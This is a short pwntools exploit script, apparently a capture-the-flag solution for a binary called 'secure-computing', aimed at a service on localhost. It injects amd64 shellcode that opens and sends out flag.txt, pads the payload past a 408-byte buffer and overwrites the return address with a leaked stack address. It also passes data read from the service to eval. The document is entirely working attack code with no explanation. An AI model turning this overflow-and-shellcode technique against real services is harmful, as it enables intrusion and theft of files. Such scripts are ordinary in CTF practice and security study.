from pwn import * 

elf = ELF('./secure-computing', checksec = False)

context.binary = elf
# p = elf.process()
p = remote("localhost", 4092)
context.arch = 'amd64'

shellcode = asm('''
    mov rax, 2
    lea rdi, [rip + flag]
    mov rsi, 0
    mov rdx, 0
    syscall 
                
    mov rdi, 1
    mov rsi, rax
    mov rax, 40
    mov r10, 40 
    syscall 

flag: 
    .string "flag.txt"
''')

p.recvline()
p.recvline()

buffer = eval(p.recvline().split(b' ')[-1][:-1].decode())

p.sendlineafter(b">> ", shellcode + cyclic(408 - len(shellcode)) + p64(buffer))

p.interactive()